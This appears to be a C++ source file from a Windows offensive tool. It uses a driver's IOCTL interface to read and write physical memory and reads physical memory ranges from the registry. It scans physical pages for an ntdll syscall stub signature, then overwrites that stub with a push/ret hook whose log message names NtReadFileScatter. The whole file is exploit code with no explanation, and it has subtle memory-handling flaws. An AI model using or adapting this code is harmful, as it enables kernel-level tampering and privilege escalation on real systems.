#include "driver.hpp"

namespace driver_util {
    char* driver::read_phys_mem(const std::uint64_t physical_addr, const unsigned int num_bytes) const {
        constexpr auto PHYSMEMSTRUCTSZ = sizeof(std::uint64_t) + sizeof(std::uint32_t);

        read_data rd_data{ physical_addr, num_bytes };

        unsigned long bytes_returned{};


        if (const auto status = DeviceIoControl(drv_handle, ctl_codes::read_ctl, &rd_data, num_bytes, &rd_data, num_bytes, &bytes_returned, nullptr); !status) {
            if (const auto err = GetLastError(); err != 998)
                util::log("Failed to read physical memory via IOCTL: %d", err);
            return nullptr;
        }

        const auto buf = new char[num_bytes];
        std::memmove(buf, &rd_data, num_bytes);
        return buf;
    }

    std::optional<std::vector<phys_mem_range>> get_physmem_ranges() {
        HKEY key{};
        if (const auto res = RegOpenKeyExA(HKEY_LOCAL_MACHINE, R"(HARDWARE\RESOURCEMAP\System Resources\Physical Memory)", 0, KEY_READ, &key); res != ERROR_SUCCESS)
            return util::log("Failed to open registry key for physical memory ranges. Error code:  %d", res), std::nullopt;

        auto data_type{ 0ul };
        auto data_size{ 0ul };

        if (const auto res = RegQueryValueExA(key, ".Translated", nullptr, &data_type, nullptr, &data_size); res != ERROR_SUCCESS)
            return util::log("Failed to query registry key for physical memory ranges. Error code:  %d", res), std::nullopt;


        const auto data = std::make_unique_for_overwrite<unsigned char[]>(data_size);
        if (const auto res = RegQueryValueExA(key, ".Translated", nullptr, &data_type, data.get(), &data_size); res != ERROR_SUCCESS)
            return util::log("Failed to query registry key for physical memory ranges. Error code:  %d", res), std::nullopt;

        const auto descriptor_count = *reinterpret_cast<DWORD*>(data.get() + 16);
        auto mem_record = data.get() + 24;

        std::vector<phys_mem_range> phys_mem_ranges{};
        for (auto i = 0u; i < descriptor_count; ++i) {
            phys_mem_ranges.push_back(phys_mem_range{ *reinterpret_cast<std::size_t*>(mem_record), *reinterpret_cast<std::uint64_t*>(mem_record + 8) });
            mem_record += 0x14;
        }
        RegCloseKey(key);
        return phys_mem_ranges;
    }

    std::size_t get_modproc_phys_addr(const driver& drv, const char* mod_name, const char* proc_name) {
        std::vector<phys_mem_range> phys_mem_ranges{};

        try {
            phys_mem_ranges = get_physmem_ranges().value();
        }
        catch (const std::bad_optional_access& err) {
            return util::log("Failed to retrieve physical memory ranges. Error message: %s", err.what()), 0;
        }

        constexpr auto bytes = std::to_array<std::uint8_t>
            ({ 0x4C, 0x8B, 0xD1, 0xB8, 0x2E, 0x00, 0x00, 0x00, 0xF6, 0x04, 0x25, 0x08, 0x03, 0xFE, 0x7F, 0x01, 0x75, 0x03, 0x0F, 0x05, 0xC3, 0xCD, 0x2E, 0xC3 });

        const auto ntdll = GetModuleHandleA(mod_name);
        if (!ntdll)
            return util::log("Failed to retrieve %s module handle. Error code: %d", mod_name, GetLastError()), 0;

        const auto ntdll_export = GetProcAddress(ntdll, proc_name);
        if (!ntdll_export)
            return util::log("Failed to retrieve %s virtual address. Error code: %d", proc_name, GetLastError()), 0;

        const auto export_page_offset = reinterpret_cast<std::size_t>(ntdll_export) % 0x1000;

        for (auto& [range_start, range_length] : phys_mem_ranges) {
            for (std::size_t page_cursor = range_start + export_page_offset; page_cursor < (range_start + range_length); page_cursor += 0x1000) {
                const auto read_bytes = std::unique_ptr<char>(drv.read_phys_mem(page_cursor, 24));
                if (!read_bytes)
                    continue;

                if (!std::memcmp(read_bytes.get(), bytes.data(), 24)) {
                    util::log("%s physical address: %p", proc_name, page_cursor);
                    return page_cursor;
                }
            }
        }
        util::log("Failed to find physical address of %s", proc_name);
        return 0;
    }

    void hook_ntproc(driver drv, std::uint64_t phys_addr) {
        char bytes[]{ 0x68, 0x00, 0x00, 0x00, 0x00, '\xC3' };

        if (const auto res = drv.write_phys_mem<char[6]>(phys_addr, bytes, 6); !res)
            return;
        util::log("Hooked NtReadFileScatter at %X", phys_addr);
    }




}

